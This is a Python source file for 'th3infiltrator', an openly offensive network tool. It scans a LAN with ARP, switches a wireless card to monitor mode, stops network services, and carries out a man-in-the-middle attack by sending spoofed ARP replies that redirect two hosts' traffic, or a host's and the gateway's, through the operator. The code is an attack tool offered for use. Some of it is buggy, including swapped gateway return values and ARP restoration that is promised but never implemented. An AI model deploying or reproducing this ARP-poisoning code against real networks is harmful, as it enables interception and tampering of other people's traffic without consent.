try:
    from termcolor import * # For program customization
    import scapy.all as scapy # For packet/frame crafting
except ModuleNotFoundError as err:
    exit("Module/s Not Found! -> Please install all dependencies from the requirements file to continue")
import re # Regular expressions
import os # For operating system functions
import subprocess # For shell commands
import time # To add a delay between menus
import sys # For sudden program termination
import socket # For user hostname resolution
import logging as log # For scapy

# Suppress scapy warnings
try: log.getLogger("scapy.runtime").setLevel(log.ERROR)
except: pass

# Global Variables
target_1_ip, target_1_mac, target_2_ip, target_2_mac = "", "", "", ""
interface = ""

# Check user permissions
def check_permissions():
    try:
        user_id = os.geteuid()
        
        if user_id != 0:
            print(colored("[-] Insufficient Permissions! This script requires root privileges. Please run it with 'sudo'.", "red"))
            sys.exit(1)
    except:
        print(colored("[-] Unable to retrieve user ID. Ensure you're on a Linux system and your system can use root privileges.", "red"))
        sys.exit(1)

# Display th3infiltrator banner
def banner():
    banner = colored("""
  _   _     ____  _        __ _ _ _             _             
 | | | |   |___ \(_)      / _(_) | |           | |            
 | |_| |__   __) |_ _ __ | |_ _| | |_ _ __ __ _| |_ ___  _ __ 
 | __| '_ \ |__ <| | '_ \|  _| | | __| '__/ _` | __/ _ \| '__|
 | |_| | | |___) | | | | | | | | | |_| | | (_| | || (_) | |             
  \__|_| |_|____/|_|_| |_|_| |_|_|\__|_|  \__,_|\__\___/|_|  
  In the digital world, trust is just another vulnerability                                                        
    """, "blue" , attrs=["bold"])
    
    print(banner)

# List all interfaces in device
def list_interfaces():
    interfaces = scapy.get_if_list()
    
    if not interfaces:
        print(colored("[-] No network interfaces found on machine! Manual interface identification is needed", "red", attrs=["bold"]))
    else:
        print(colored("=== AVAILABLE INTERFACES ===", "green", attrs=["bold"]))
        for interface in interfaces:
            print(colored("[*] " + interface, "white", attrs=["bold"]))
        print()
    
# Display program help menu
def help_menu():
    # Title Section
    print(colored('╔═══════════════════════════════════════╗', attrs=["bold"]))
    print(colored('║            AVAILABLE MODULES          ║', attrs=["bold"]))
    print(colored('╚═══════════════════════════════════════╝', attrs=["bold"]))
    
    options = [
        colored("[1] set target1 <target_1_ip> <target_1_mac>", attrs=["bold"]),
        colored("[2] set target2 <target_2_ip> <target_2_mac>", attrs=["bold"]),
        colored("[3] find mac <target_ip>", attrs=["bold"]),
        colored("[4] View Targets", attrs=["bold"]),
        colored("[5] Host Scan", attrs=["bold"]),
        colored("[6] Attack", attrs=["bold"])
    ]

    for option in options:
        print(option)
    print()
    
    # Title Section
    print(colored('╔═══════════════════════════════════════╗', attrs=["bold"]))
    print(colored('║           ADDITIONAL MODULES          ║', attrs=["bold"]))
    print(colored('╚═══════════════════════════════════════╝', attrs=["bold"]))
        
    print(f"""[1] Type {colored('help', 'green')} to view the help menu
[2] Type {colored('--help <command>', 'green')} to view help on command (Ignoring the '<>')
[3] Type {colored('clear', 'green')} to clear the screen
[4] Type {colored('process_conflict', 'green')} to view conflicting network processes
[5] Type {colored('exit', 'green')} to quit the program""")    

# Validate user IP
def validate_ip(ip_addr):
    expression = r"\b(10\.(?:[0-9]{1,3}\.){2}[0-9]{1,3}|172\.(?:1[6-9]|2[0-9]|3[01])\.[0-9]{1,3}\.[0-9]{1,3}|192\.168\.[0-9]{1,3}\.[0-9]{1,3})\b"
    output = re.search(expression, ip_addr)
    
    if not output:
        return "invalid"

# Validate user MAC
def validate_mac(mac):
    expression = r"\b([0-9A-Fa-f]{2}([-:]){1}[0-9A-Fa-f]{2}\2[0-9A-Fa-f]{2}\2[0-9A-Fa-f]{2}\2[0-9A-Fa-f]{2}\2[0-9A-Fa-f]{2}|[0-9A-Fa-f]{12})\b"
    output = re.search(expression, mac)
    
    if not output:
        return "invalid"

# Scan active hosts in network 
def scan_hosts(interface):  
    ip_addr = scan_hosts_menu() # Main Menu
    print(colored("\n[!] Started Host Scan . . .", attrs=["bold"]))
      
    ether_frame = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_frame = scapy.ARP(pdst=ip_addr)
    
    broadcast_frame = ether_frame/arp_frame
    try:
        result = scapy.srp(broadcast_frame, timeout=5, verbose=False, iface=interface, op=1)[0]
    except:
        print(colored("[-] Unidentified Error when Scanning ... SKIPPING TARGET", "red"))
        result = []
    
    recieved_output, host_counter = [], 0
    for sent, recieved in result:
        recieved_output.append(f"{recieved.hwsrc}::{recieved.psrc}")
        host_counter += 1

    return recieved_output, host_counter

# Menu that comes when user choses scan host
def scan_hosts_menu():
    def define_ip():
        while True:
            ip_addr = input("Define IP address > ").strip()
            if not ip_addr:
                print(colored("[-] Blank IP Entered! Please try again \n", "red"))
                continue
            elif validate_ip(ip_addr) == "invalid":
                print(colored("[-] Invalid Local IP Format Entered! Please try again \n", "red"))
                continue                
            break
        return ip_addr
        
    ip_addr = ""
    local_ip = get_local_ip()
   
    if local_ip:
        user_choice = input(f"Use detected IP address ({colored(local_ip, 'yellow', attrs=['bold'])})? [Y/N]: ").strip().upper()
        if user_choice != "Y":
            ip_addr = define_ip()
        else:
            ip_addr = local_ip
    else:
        while True:
            ip_addr = input("Define IP address > ").strip()
            if not ip_addr:
                print("[-] Blank IP Entered! Please try again")
                continue
            elif validate_ip(ip_addr) == "invalid":
                print("[-] Invalid Local IP Format Entered! Please try again")
                continue                
            break
                    
    # Append CIDR notation to IP
    common_cidr_pattern = r"\/(8|16|24|30|32)"
    cidr_result = re.search(common_cidr_pattern, ip_addr)
    
    # Append if no notation is entered
    if not cidr_result:
        ip_addr = ip_addr+"/24" # Default to most common one

    return ip_addr

# Parsing the output of the scan hosts function
def scan_hosts_output(scan_result):
    scan_result, host_counter = scan_result
    if scan_result:
        print(colored("MAC\t\t\tIP\t\t\tHOSTNAME", attrs=["bold"]))
        for content in scan_result:
            ip, mac = content.split("::")
            print(f"{colored(ip, 'green')}\t{colored(mac, 'green')}\t\t{get_hostname(ip)}")
        
        print(f"\n\t\t\tFound a total of {colored(host_counter, 'green', attrs=['bold'])} hosts")
    else:
        print(colored("[-] No Hosts Where Detected", "yellow"))

# Get local device IP to use in scan host
def get_local_ip():
    expression = r"\b(?:10\.(?:[0-9]{1,3}\.){2}[0-9]{1,3}|172\.(?:1[6-9]|2[0-9]|3[01])\.[0-9]{1,3}\.[0-9]{1,3}|192\.168\.[0-9]{1,3}\.[0-9]{1,3})\b"
    command_output = process_command("ifconfig")
    
    expression_output = re.findall(expression, command_output)
    if expression_output:
        return expression_output[0]

    return None

# Try get hostname of found devices with reverse DNS
def get_hostname(ip_addr):
    # Try local resolution with socket
    try:
        hostname = socket.gethostbyaddr(ip_addr)[0]
        return colored(hostname, "green")
    except:
        pass 

    # Reverse DNS lookup if socket fails
    query_name = f"{ip_addr}.in-addr.arpa"
    ip = scapy.IP(dst="8.8.8.8")
    udp = scapy.UDP(dport=53)
    dns = scapy.DNS(rd=1, qd=scapy.DNSQR(qname=query_name, qtype='PTR'))
    
    try:
        full_packet = ip/udp/dns
        response = scapy.sr1(full_packet, timeout=3, verbose=False)
        
        if response and response.haslayer(scapy.DNS):
            dns_layer = response.getlayer(scapy.DNS)
            if dns_layer.ancount > 0:
                hostname = dns_layer.an.rdata.decode('utf-8')
                return colored(hostname, "green")
            else:
                return colored("Unable to Retrieve Hostname", "yellow")
        else:
            return colored("Unable to Retrieve Hostname", "yellow")
    
    except:
        return colored("Unable to Retrieve Hostname", "yellow")

# Main Menu Input
def main_menu_input():
    # Instruction Section
    print("\n┐"+colored('::Define your choice by entering the command::', attrs=['bold'], color='blue'))
    
    # User Input Section
    user_input = input('└──> Enter Choice > ').lower()
    if user_input in ["1", "2", "3", "4", "5", "6"]:
        print(colored("[-] Please enter the full command and not the command number", "red"))
        main_menu_input()
    
    return user_input

# Main menu of options for program
def th3infiltrator_main_menu():
    global interface # Access interface globally
    
    # Selection
    while True:
        try:
            user_input = main_menu_input()
        except KeyboardInterrupt:
            break
        
        if user_input == "host scan":
            scan_result = scan_hosts(interface)
            scan_hosts_output(scan_result)
        elif user_input == "clear":
            clear_screen()
            banner()
        elif user_input == "help":
            help_menu()
        elif "--help" in user_input:
            command_help(user_input)
        elif "set target" in user_input:
            target_command(user_input)
        elif user_input == "view targets":
            targets_view()
        elif user_input == "process_conflict":
            check_interfering_services()
        elif user_input == "attack":
            attack(interface)
        elif "find mac" in user_input:
            find_mac(interface)
        elif user_input == "exit":
            break
        else:
            print(colored("[-] Invalid Option! Refer to the help menu", "red"))

# Cleares program screen 
def clear_screen():
    try:
        os.system("clear")
    except:
        print(colored("[-] Unable to clear terminal screen", "red"))
    
# Function for displaying detailed descriptions of commands
def command_help(user_input):
    command = user_input[7::]
    if not command:
        print(colored("[-] Incorrect command usage. Ensure it is in this format : --help <command name>", "red"))
        return
    
    asterics = "["+colored("*", "green", attrs=["bold"])+"] "
    if command == "host scan" or command in ["host", "scan"]:
        print(asterics+"Initiate a scan to discover all active hosts on the network. This will display the IP address and MAC address of each device, and in some cases, the hostname as well.")
    elif command == "attack":
        print(asterics+"Start the Man-in-the-Middle (MITM) attack. Make sure that both 'target1' and 'target2' have been defined before executing this command.")
    elif "target" in command:
        print(asterics+"Use 'set target1 [IP_ADDRESS] [MAC]' and 'set target2 [IP_ADDRESS] [MAC]', replacing placeholders with actual IP and MAC addresses.")
    elif command == "clear":
        print(asterics+"Clear the screen entirely. Use 'help' to display the available commands again.")
    elif command == "help":
        print(asterics+"Show the main help menu for th3infiltrator.")
    elif command == "view targets":
        print(asterics+"View current targets saved, If no results are shown, define them first.")
    elif command == "process_conflict" or command in ["process", "conflict"]:
        print(asterics+"View any conflicting network processes that the system is running. You can optionally terminate them.")
    elif "find mac" in command:
        print(asterics+"Find out the MAC address of a target by just knowing their IP. Use 'find mac [IP_ADDRESS]', replacing the placeholder with the actual IP.")
    elif command == "exit":
        print(asterics+"Exit the program and terminate all active connections. The target's ARP table will default to normal if a MITM attack is ongoing.")
    else:
        print(colored("[-] Unknown command entered. Please enter a valid command for th3infiltrator.", "red"))

# Put wireless interface in monitor mode
def wifi_monitor_mode(interface):
    success_tick = colored("[✓] ", "green", attrs=["bold"])
    
    result = process_command("iwconfig")
    if "Mode:Monitor" in result:
        print(colored("[+] Wireless Interface Already set to Monitor", "green"))
        return "success"
    else:
        if interface not in result:
            print(colored("[-] Invalid Interface! Please enter an interface that you have", "red"))
            return "fail"
    
    print("\nTurning off interface ...")
    try:
        result = process_command(f"ifconfig {interface} down")
    except Exception as err:
        print(colored(f"[-] An unidentified error has occurred when turning off the interface\n--->{err}", "red"))
        return "fail"
    print(f"{success_tick} Success!")

    print("Setting wireless interface to monitor ...")
    try:
        result = process_command(f"iwconfig {interface} mode monitor")
        if "Operation not supported" in result:
            print(colored(f"[-] Unable to set '{interface}' interface to monitor mode. Please ensure you selected a wireless interface!", "red"))
            process_command(f"ifconfig {interface} up")
            return "fail"
    except Exception as err:
        print(colored(f"[-] An unidentified error has occurred when turning interface to monitor mode\n--->{err}", "red"))
        return "fail"
    print(f"{success_tick} Success!")

    print("Turning on interface ...")
    process_command(f"ifconfig {interface} up")
    print(f"{success_tick} Success!")
    
    print(colored("\n[+] Wireless Interface Successfully set to 'Monitor' Mode", "green"))
    return "success"

# Check if wireless extensions are enabled
def check_for_wireless_extensions():
    def download_package(name):
        result = process_command(f"apt install {name}")
        return result
    def check_interface(interface):
        pattern = re.compile(rf"^{re.escape(interface)}\s+no wireless extensions\.$")
        result = re.findall(pattern, interface)
        if not result: return "invalid"
    
    output = process_command("iwconfig")
    success_tick = colored("[✓]", "green", attrs=["bold"])
    
    if "not found" in output or "No such file or directory" in output:
        print(colored("[-] Unable to run 'iwconfig' to verify wireless network interfaces. Attempting to install package to try fix problem. . .", "red"))
        output = download_package("wireless-tools")
        if "Permission denied" in output:
            print(colored("[-] Permission Denied when Installing. Please run this application in root!", "red"))
            return "fail"
        elif "additional disk space will be used" in output:
            return "success"
        elif check_interface(interface) == "invalid":
            print(colored("[-] Interface does not have any wireless extensions! Please use a wireless interface", "red"))
            return "fail"
        else:
            print(colored("\n[-] An internal issue was caught, and no package was able to be installed. Command Output Snippet :", "red"))
            print(colored(output, attrs=["bold"]))
            print(colored("\n[-] Program Terminated due to no access to a wireless interface", "red"))
            return "fail"
    elif "IEEE 802.11" in output:
        print(colored(f"\n{success_tick} Interfaces Found - Continuining with process", "green"))
        return "success"
    else:
        print(colored("\n[-] Unable to parse 'iwconfig' command output. No network information found on any wireless interface!", "red"))
        user_choice = input("If you think this is a false warning, ignore it. Continue with the program regardless of caught warnings? (Y/N) - ").upper()
        if user_choice == "Y":
            print(colored("\n[!] Ignoring error and continuining with program", "yellow"))
            return "success_with_warning"
        else:
            print("\n[!] Program Aborted - Exited Successfully")
            return "fail"

# Check for linux machine, and check wifi mode
def check_and_set_wireless_interface():
    global interface
    setup_interface_banner()
    
    try:
        wireless_interface = input("Enter your wireless interface : ").strip().lower()
        interface = wireless_interface # Define global variable
    except KeyboardInterrupt:
        exit("\n[!] Program Aborted")
        
    if wireless_interface:
        output = check_for_wireless_extensions()
        
        if output == "fail":
            sys.exit(1)
        elif output != "success_with_warning":
            if wifi_monitor_mode(wireless_interface) == "fail":
                sys.exit(1)
    else:
        exit(colored("[-] Cannot proceed with no interface! Ensure you enter a wireless interface", "red"))

    print("\n[!] Redirecting you to main menu")
    time.sleep(3)
    clear_screen()
        
# Process shell commands
def process_command(command):
    result = ''
    try:
        output = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = output.communicate()
        result = stdout.decode().strip() + stderr.decode().strip()
    except subprocess.CalledProcessError as e:
        result = f"Internal Execution Error : {e}"
    except Exception as err:
        result = f"Unknown Error : {err}"
    
    return result

# Check any network services that could possibly interfer
def check_interfering_services():
    def terminate_services(services):
        success_tick = colored("[✓] ", "green", attrs=["bold"])
        
        for service in services:
            output = process_command(f"systemctl stop {service}")
            
            if "Failed to stop" in output:
                print(f"[-] Unable to terminate {service}")
            else:
                print(f"{success_tick} Service {colored({service}, attrs=['bold'])} terminated successfully")
        
    services = ["NetworkManager", "wpa_supplicant", "dhclient", "hostapd", "ModemManager"]
    service_found = []
    
    print("[!] Checking services ...")
    for service in services:
        try:
            result = process_command(f"systemctl status {service}")
        except:
            pass
        
        if "active" in result:
            PID_number = ""
            output_PID = re.search(r"Main PID:\s+(\d+)", result)
            if not output_PID:
                PID_number = "N/A"
            else:
                PID_number = output_PID.group(1)
            
            service_found.append(service)    
            print(f"   --> Possible interfering service : {colored(service, attrs=['bold'])} (Running on PID: {PID_number})")
    print("[+] Service Check Completed \n")
    
    print("Would you like to terminate all conflicting processes?")
    user_choice = input("This action may potentially cause network issues. Do you want to proceed? (Y/N) > ").upper().strip()
    if user_choice == "Y":
        print()
        terminate_services(service_found)
        print()
    else:
        print("\n[!] Operation Aborted")
        return

# View active/inactive targets
def targets_view():
    global target_1_ip, target_2_ip
    global target_1_mac, target_2_mac
    
    if not target_1_ip or not target_1_mac:
        target_1_ip = colored("Not Currently Defined", "red")
        target_1_mac = colored("Not Currently Defined", "red")
    else:
        target_1_ip = colored(target_1_ip, "green")
        target_1_mac = colored(target_1_mac, "green")
    
    if not target_2_ip or not target_2_mac:
        target_2_ip = colored("Not Currently Defined", "red")
        target_2_mac = colored("Not Currently Defined", "red")
    else:
        target_2_ip = colored(target_2_ip, "green")
        target_2_mac = colored(target_2_mac, "green")
    
    print(f"[+] TARGET 1 VALUE - IP: {target_1_ip}  MAC: {target_1_mac}")
    print(f"[+] TARGET 2 VALUE - IP: {target_2_ip}  MAC: {target_2_mac}")

# Main function which holds everything
def main():
    check_permissions()
    check_and_set_wireless_interface()
    banner()
    help_menu()
    th3infiltrator_main_menu()

# Extract the IP and MAC address
def extract_ip_and_mac(string_value):
    if validate_ip(string_value) == "invalid":
        print(colored("[-] Invalid IP Format Entered. Ensure it is a correct local IP", "red"))
        return "", ""
    elif validate_mac(string_value) == "invalid":
        print(colored("[-] Invalid MAC Address Format Entered! Ensure value is of the correct lenght", "red"))
        return "", ""
    
    ip_expression = r"\b(?:10\.(?:[0-9]{1,3}\.){2}[0-9]{1,3}|172\.(?:1[6-9]|2[0-9]|3[01])\.[0-9]{1,3}\.[0-9]{1,3}|192\.168\.[0-9]{1,3}\.[0-9]{1,3})\b"
    mac_expression = r"\b([0-9A-Fa-f]{2}([-:]){1}[0-9A-Fa-f]{2}\2[0-9A-Fa-f]{2}\2[0-9A-Fa-f]{2}\2[0-9A-Fa-f]{2}\2[0-9A-Fa-f]{2}|[0-9A-Fa-f]{12})\b"
    
    ip_address = re.findall(ip_expression, string_value)[0]
    mac_address = re.findall(mac_expression, string_value)[0][0]
    
    return ip_address, mac_address

# Function which handles target definition
def target_command(user_input):
    global target_1_ip, target_1_mac 
    global target_2_ip, target_2_mac
    
    try:
        target_number = user_input[10]
    except:
        print(colored("[-] No Target Value Defined!", "red"))
        return
    
    ip, mac = extract_ip_and_mac(user_input)
    if not ip and not mac:
        return
    
    if target_number == "1":
        target_1_ip, target_1_mac = ip, mac
        
        sentance = colored("[+] Target 1 Defined", attrs=["bold"])
        print(f"{sentance} ---> IP: {colored(target_1_ip, 'green')} | MAC: {colored(target_1_mac, 'green')}")
    elif target_number == "2":
        target_2_ip, target_2_mac = ip, mac
        
        sentance = colored("[+] Target 2 Defined", attrs=["bold"])
        print(f"{sentance} ---> IP: {colored(target_2_ip, 'green')} | MAC: {colored(target_2_mac, 'green')}")
    else:
        print(colored("[-] Invalid Target Number. Enter a value between 1 and 2", "red"))    

def parse_targets():
    gateway_ip, gateway_mac = get_default_gateway_mac_ip()
    if not gateway_ip and not gateway_mac:
        gateway_ip, gateway_mac = get_gateway_info()
    
    return gateway_ip, gateway_mac

# Send spoofed ARP requests
def poison_targets(interface, local_mac, gateway_ip=None, gateway_mac=None):
    global target_1_ip, target_2_ip
    global target_1_mac, target_2_mac
    
    print(f"Poisoning IP -> {target_1_ip}") # debugging
    print(f"Poisoning MAC -> {target_1_mac}") # debugging
            
    if target_1_ip and target_2_ip:    
        poisoned_arp_packet_1 = scapy.ARP(hwdst=target_1_mac, psrc=target_2_ip, pdst=target_1_ip, hwsrc=local_mac, op=2)
        poisoned_arp_packet_2 = scapy.ARP(hwdst=target_2_mac, psrc=target_1_ip, pdst=target_2_ip, hwsrc=local_mac, op=2)
    elif not target_1_ip:
        poisoned_arp_packet_1 = scapy.ARP(hwdst=target_2_mac, psrc=gateway_ip, pdst=target_2_ip, hwsrc=local_mac, op=2)
        poisoned_arp_packet_2 = scapy.ARP(hwdst=gateway_mac, psrc=target_2_ip, pdst=gateway_ip, hwsrc=local_mac, op=2)
    elif not target_2_ip:
        poisoned_arp_packet_1 = scapy.ARP(hwdst=target_1_mac, psrc=gateway_ip, pdst=target_1_ip, hwsrc=local_mac, op=2)
        poisoned_arp_packet_2 = scapy.ARP(hwdst=gateway_mac, psrc=target_1_ip, pdst=gateway_ip, hwsrc=local_mac, op=2)
    
    scapy.send(poisoned_arp_packet_1, verbose=False, iface=interface)
    scapy.send(poisoned_arp_packet_2, verbose=False, iface=interface)

# Define arguments required for attack function
def check_attack_arguments(interface):
    def get_valid_mac():
        while True:
            device_mac = input("Enter MAC Address > ").strip()
            if validate_mac(device_mac) == "invalid":
                print(colored("[-] Invalid MAC Address Format Entered! Ensure value is of the correct length", "red"))
            else:
                return device_mac
            
    global target_1_ip, target_2_ip
    global target_1_mac, target_2_mac
            
    if not target_1_ip and not target_1_mac and not target_2_ip and not target_2_mac:
        print(colored("[-] No Target Defined! Please define the target first", "red"))
        return ""

    device_mac = find_mac(interface)
    if device_mac == "failed":
        device_mac = get_valid_mac()
    else:
        user_choice = input(f"Use detected MAC address ({colored(device_mac, 'yellow', attrs=['bold'])})? [Y/N]: ").strip().upper()
        if user_choice == "N":
            device_mac = get_valid_mac()
                
    return device_mac

# Enter gateway info manually
def get_gateway_info():
    print(colored("[-] Unable to retrieve gateway information", "red"))
    ip = input("Enter Gateway/Target IP > ").strip()
    mac = input("Enter Gateway/Target MAC > ").strip()
    
    return ip, mac

# Begin ARP poisoning
def attack(interface):
    global target_1_ip, target_2_ip
    
    local_mac = check_attack_arguments(interface)
    if not local_mac: return
    
    print("[!] Crafting and sending spoofed ARP responses ...")
    if not target_1_ip or not target_2_ip:
        print("\n[!] Second Target Not Defined - Looking for default gateway information ...")
        gateway_ip, gateway_mac = parse_targets()
        poison_targets(interface, local_mac, gateway_ip, gateway_mac)
    else:
        poison_targets(interface, local_mac)
    print("[!] Crafting and sending spoofed ARP responses ...")

# Get default gatway IP address
def get_default_gateway_ip():
    expression = r"\b(10\.(?:[0-9]{1,3}\.){2}[0-9]{1,3}|172\.(?:1[6-9]|2[0-9]|3[01])\.[0-9]{1,3}\.[0-9]{1,3}|192\.168\.[0-9]{1,3}\.[0-9]{1,3})\b"
    output = process_command("ip route | grep 'default'")
    
    if "default" not in output:
        return None
    else:
        extracted_ip = re.findall(expression, output)[0]
        if extracted_ip:
            return extracted_ip
        else:
            return None
        
# Get default gateway MAC address
def get_default_gateway_mac_ip():
    gateway_ip = get_default_gateway_ip()
    if not gateway_ip:
        return None, None
    
    output = process_command("ip neigh")
    if not output:
        return None, None
    
    match = re.search(rf"{re.escape(gateway_ip)}.*lladdr\s+([0-9a-fA-F:]+)", output)
    
    if match:
        print(colored("[+] Default Gateway IP and MAC found", "green"))
        return match.group(1), gateway_ip
    else:
        return None, None

# Find the mac address with an IP
def find_mac(interface): 
    output = process_command(f"ifconfig {interface}")
    mac_expression = r"\b([0-9A-Fa-f]{2}([-:]){1}[0-9A-Fa-f]{2}\2[0-9A-Fa-f]{2}\2[0-9A-Fa-f]{2}\2[0-9A-Fa-f]{2}\2[0-9A-Fa-f]{2}|[0-9A-Fa-f]{12})\b"
    
    output = re.findall(mac_expression, output)[0][0]
    if output:
        if output == "Device not found":
            print(colored("[-] Unable to get interface information, please resort to entering the MAC manually", "red"))
            return "failed"
        else:
            if validate_mac(output) != "invalid":
                return output
            else:
                print(colored("[-] Unable to parse MAC address from output, please resort to entering the MAC manually", "red"))
                return "failed"
    else:
        print(colored("[-] No MAC address found in interface, please resort to entering the MAC manually", "red"))
        return "failed"
    
# Setup banner
def setup_interface_banner(): 
    banner = colored(r"""
    _   __     __                      __      _____      __            
   / | / /__  / /__      ______  _____/ /__   / ___/___  / /___  ______ 
  /  |/ / _ \/ __/ | /| / / __ \/ ___/ //_/   \__ \/ _ \/ __/ / / / __ \
 / /|  /  __/ /_ | |/ |/ / /_/ / /  / ,<     ___/ /  __/ /_/ /_/ / /_/ /
/_/ |_/\___/\__/ |__/|__/\____/_/  /_/|_|   /____/\___/\__/\__,_/ .___/ 
                                                               /_/      
    """, "green")
    text = colored("\t\t     >Th3infiltrator Network Setup<", attrs=["bold"])
    
    print(banner+text)
    print(colored("\n* Th3infiltrator will check if your network interfaces are compatible and in monitor mode *", attrs=["bold"]))
    
    print()
    list_interfaces()

# Run main program
if __name__ == "__main__":
    main()
    print("\n[!] Program Exited Successfully. Thank you for using Th3infiltrator")